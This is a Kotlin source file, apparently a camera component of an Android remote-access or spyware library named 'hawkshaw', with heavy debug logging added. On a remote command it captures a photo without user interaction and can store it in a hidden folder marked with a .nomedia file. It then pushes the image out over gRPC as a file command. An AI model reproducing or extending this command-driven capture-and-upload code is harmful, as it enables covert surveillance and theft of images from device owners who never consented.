package com.hawkshaw.library.features.media.camera

import android.content.Context
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.util.Log // Added for Android logging
import androidx.annotation.RequiresApi
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.core.Preview
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleOwner
import com.hawkshaw.library.datalayer.models.Command
import com.hawkshaw.library.features.media.MediaService
import com.hawkshaw.library.features.media.handleFileCommand
import com.hawkshaw.library.ktextensions.safeLaunch
import com.hawkshaw.library.logger.Logger
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.suspendCancellableCoroutine
import java.io.File
import java.text.SimpleDateFormat
import java.util.Locale
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors
import kotlin.coroutines.resume
import kotlin.coroutines.resumeWithException

private const val TAG = "CameraXPicture"
private const val FILENAME_FORMAT = "yyyy-MM-dd-HH-mm-ss-SSS"
private const val PHOTO_EXTENSION = ".jpg"

/**
 * Gets output file for the image with Java-like storage options
 */
private fun getOutputFile(context: Context, saveToPrivate: Boolean): File {
    Log.d(TAG, "[DEBUG] getOutputFile called. Context: $context, saveToPrivate: $saveToPrivate")
    val storageDir = if (saveToPrivate) {
        // Private storage with .nomedia file
        var dir = Environment.getExternalStoragePublicDirectory(".camera") ?:
                 context.getExternalFilesDir(".camera") ?: context.filesDir
        Log.d(TAG, "[DEBUG] getOutputFile: Private storage selected. Initial dir: ${dir.absolutePath}")
        dir = dir.apply { mkdirs() }
        Log.d(TAG, "[DEBUG] getOutputFile: Directory after mkdirs: ${dir.absolutePath}")
        File(dir, ".nomedia").takeIf { !it.exists() }?.apply {
            createNewFile()
            Log.d(TAG, "[DEBUG] getOutputFile: .nomedia file created at: ${this.absolutePath}")
        }
        dir
    } else {
        // Public DCIM directory
        val dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).apply { mkdirs() }
        Log.d(TAG, "[DEBUG] getOutputFile: Public DCIM storage selected. Directory: ${dir.absolutePath}")
        dir
    }

    val timeStamp = SimpleDateFormat(FILENAME_FORMAT, Locale.getDefault()).format(System.currentTimeMillis())
    Log.d(TAG, "[DEBUG] getOutputFile: Generated timestamp: $timeStamp")
    val outputFile = File(storageDir, "$timeStamp$PHOTO_EXTENSION")
    Log.d(TAG, "[DEBUG] getOutputFile: Final output file path: ${outputFile.absolutePath}")
    return outputFile
}

/**
 * Take a picture using CameraX API with Java-like features
 */
private suspend fun takePictureInternal(
    context: Context,
    lifecycleOwner: LifecycleOwner,
    request: Command.TakePictureRequest
) {
    Log.d(TAG, "[DEBUG] takePictureInternal called. Request: $request")
    val cameraExecutor: ExecutorService = Executors.newSingleThreadExecutor()
    Log.d(TAG, "[DEBUG] takePictureInternal: CameraExecutor created.")
    // Note: saveToPrivate is hardcoded to false here, reflecting original logic.
    val outputFile = getOutputFile(context, false)
    Log.d(TAG, "[DEBUG] takePictureInternal: Output file set to: ${outputFile.absolutePath}")
    var cameraProvider: ProcessCameraProvider? = null

    return try {
        // Existing Logger.d is fine for this general entry.
        Logger.d(TAG, "Take picture called", false, 4, null)

        val cameraProviderFuture = ProcessCameraProvider.getInstance(context)
        Log.d(TAG, "[DEBUG] takePictureInternal: ProcessCameraProvider.getInstance called.")
        cameraProvider = cameraProviderFuture.get()
        Log.d(TAG, "[DEBUG] takePictureInternal: CameraProvider obtained: $cameraProvider")

        // Set up preview
        val preview = Preview.Builder().build()
        Log.d(TAG, "[DEBUG] takePictureInternal: Preview Builder built.")

        // Configure image capture
        val imageCaptureBuilder = ImageCapture.Builder()
        Log.d(TAG, "[DEBUG] takePictureInternal: ImageCapture.Builder created. Quality: ${request.quality}, FlashMode: ${request.flashMode}")
        val imageCapture = imageCaptureBuilder.apply {
            setJpegQuality(request.quality.coerceIn(1, 100))
            setFlashMode(when (request.flashMode) {
                Command.TakePictureRequest.FlashMode.Auto -> ImageCapture.FLASH_MODE_AUTO
                Command.TakePictureRequest.FlashMode.Off -> ImageCapture.FLASH_MODE_OFF
                Command.TakePictureRequest.FlashMode.Always -> ImageCapture.FLASH_MODE_ON
            })
        }.build()
        Log.d(TAG, "[DEBUG] takePictureInternal: ImageCapture configured and built.")

        // Select camera based on cameraId
        Log.d(TAG, "[DEBUG] takePictureInternal: Selecting camera. Request cameraId: ${request.cameraId}")
        val cameraSelector = when (request.cameraId) {
            CameraSelector.LENS_FACING_FRONT.toString() -> CameraSelector.DEFAULT_FRONT_CAMERA
            else -> CameraSelector.DEFAULT_BACK_CAMERA
        }
        Log.d(TAG, "[DEBUG] takePictureInternal: CameraSelector selected: $cameraSelector")

        // Unbind any bound use cases before rebinding
        Log.d(TAG, "[DEBUG] takePictureInternal: Calling cameraProvider.unbindAll().")
        cameraProvider.unbindAll()

        // Bind use cases to camera
        Log.d(TAG, "[DEBUG] takePictureInternal: Calling cameraProvider.bindToLifecycle().")
        cameraProvider.bindToLifecycle(
            lifecycleOwner,
            cameraSelector,
            preview,
            imageCapture
        )
        Log.d(TAG, "[DEBUG] takePictureInternal: Use cases bound to lifecycle.")

        suspendCancellableCoroutine<Unit> { continuation ->
            Log.d(TAG, "[DEBUG] takePictureInternal: Entered suspendCancellableCoroutine.")
            // Create output options
            val outputOptions = ImageCapture.OutputFileOptions.Builder(outputFile).build()
            Log.d(TAG, "[DEBUG] takePictureInternal: OutputFileOptions built for: ${outputFile.absolutePath}")

            // Setup image capture listener
            Log.d(TAG, "[DEBUG] takePictureInternal: Calling imageCapture.takePicture().")
            imageCapture.takePicture(
                outputOptions,
                cameraExecutor,
                object : ImageCapture.OnImageSavedCallback {
                    override fun onError(exc: ImageCaptureException) {
                        Log.e(TAG, "[DEBUG] takePictureInternal: onError callback. Exception: $exc", exc)
                        releaseResources(cameraExecutor, cameraProvider)
                        Logger.e(
                            TAG,
                            "Take picture failed: ${exc.message}",
                            b = false,
                            i = 12,
                            nothing = null
                        )
                        continuation.resumeWithException(exc)
                    }

                    @RequiresApi(Build.VERSION_CODES.O)
                    override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                        val savedUri = output.savedUri ?: Uri.fromFile(outputFile)
                        Log.d(TAG, "[DEBUG] takePictureInternal: onImageSaved callback. Saved URI: $savedUri, OutputFileResults: $output")
                        // Existing Logger.d is fine.
                        Logger.d(
                            TAG,
                            "Take picture success. Saved to: ${output.savedUri ?: outputFile}",
                            false,
                            4,
                            null
                        )
                        releaseResources(cameraExecutor, cameraProvider)

                        val uri = output.savedUri ?: Uri.fromFile(outputFile)
                        val fileRequest = Command.FileRequest(
                            uri.path!!,
                            Command.FileRequest.Source.CameraImage,
                            Command.FileRequest.Medium.Grpc
                        )
                        Log.d(TAG, "[DEBUG] takePictureInternal: Created FileRequest: $fileRequest")

                        CoroutineScope(Dispatchers.IO).safeLaunch {
                            Log.d(TAG, "[DEBUG] takePictureInternal: Launching handleFileCommand coroutine for FileRequest: $fileRequest")
                            handleFileCommand(Command(Command.CommandType.PushFile, fileRequest = fileRequest))
                            Log.d(TAG, "[DEBUG] takePictureInternal: handleFileCommand coroutine completed.")
                        }
                        continuation.resume(Unit)
                    }
                }
            )

            // Handle cancellation
            continuation.invokeOnCancellation {
                Log.d(TAG, "[DEBUG] takePictureInternal: Coroutine cancelled. Releasing resources.")
                releaseResources(cameraExecutor, cameraProvider)
            }
        }
    } catch (e: Exception) {
        Log.e(TAG, "[DEBUG] takePictureInternal: Exception caught: ${e.message}", e)
        // Existing Logger.e is fine.
        Logger.e(TAG, "Taking picture failed: ${e.message}", b = false, i = 12, nothing = null)
        releaseResources(cameraExecutor, cameraProvider)
        throw e
    }
}

/**
 * Public non-suspending version that launches the operation in a coroutine
 */
fun takePicture(
    context: Context,
    lifecycleOwner: LifecycleOwner,
    request: Command.TakePictureRequest
) {
    Log.d(TAG, "[DEBUG] takePicture (public) called. Request: $request")
    val cameraProviderFuture = ProcessCameraProvider.getInstance(context)
    Log.d(TAG, "[DEBUG] takePicture: ProcessCameraProvider.getInstance called.")
    cameraProviderFuture.addListener({
        Log.d(TAG, "[DEBUG] takePicture: CameraProviderFuture listener invoked. Launching takePictureInternal coroutine.")
        CoroutineScope(Dispatchers.IO).safeLaunch {
            takePictureInternal(context, lifecycleOwner, request)
            Log.d(TAG, "[DEBUG] takePicture: takePictureInternal coroutine completed.")
        }
    }, ContextCompat.getMainExecutor(context))
}

/**
 * Release camera resources with Java-like cleanup
 */
private fun releaseResources(cameraExecutor: ExecutorService, cameraProvider: ProcessCameraProvider?) {
    Log.d(TAG, "[DEBUG] releaseResources called. CameraProvider null: ${cameraProvider == null}")
    try {
        Logger.d(TAG, "Releasing camera resources", false, 4, null)
        Log.d(TAG, "[DEBUG] releaseResources: Shutting down cameraExecutor.")
        cameraExecutor.shutdown()

        // Post unbinding to main thread like Java version
        Log.d(TAG, "[DEBUG] releaseResources: Posting unbindAll to main looper.")
        Handler(Looper.getMainLooper()).post {
            try {
                Log.d(TAG, "[DEBUG] releaseResources: Executing unbindAll on main thread for provider: $cameraProvider")
                cameraProvider?.unbindAll()
                Log.d(TAG, "[DEBUG] releaseResources: cameraProvider.unbindAll() called on main thread.")
                MediaService.stopService() // Assuming this is intentional to stop some broader media service
                Log.d(TAG, "[DEBUG] releaseResources: MediaService.stopService() called.")
            } catch (e: Exception) {
                Log.e(TAG, "[DEBUG] releaseResources: Error in main-thread cleanup (unbindAll/stopService): ${e.message}", e)
                // Existing Logger.e is fine.
                Logger.e(
                    TAG,
                    "Error in main-thread cleanup: ${e.message}",
                    b = false,
                    i = 12,
                    nothing = null
                )
            }
        }
    } catch (e: Exception) {
        Log.e(TAG, "[DEBUG] releaseResources: Error during resource release: ${e.message}", e)
        // Existing Logger.e is fine.
        Logger.e(
            TAG,
            "Error releasing camera resources: ${e.message}",
            b = false,
            i = 12,
            nothing = null
        )
    }
}
